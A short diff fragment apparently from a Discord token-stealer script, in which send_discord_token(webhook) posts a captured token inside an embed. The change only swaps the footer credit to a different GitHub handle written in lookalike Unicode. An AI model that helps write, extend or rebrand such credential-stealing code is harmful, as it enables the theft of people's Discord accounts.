@@ -126,7 +126,7 @@ def send_discord_token(webhook: str):
                         "description": f"**```{token}```**",
                         "color": 0x139e8c,
                         "footer": {
-                        "text": "ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤhttps://github.com/Ezo4kaXD" 
+                        "text": "ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤɢɪᴛʜᴜʙ.ᴄᴏᴍ/403ᴏʙsᴇʀᴠᴀɴᴛ" 
                         }
                     }
                 ]
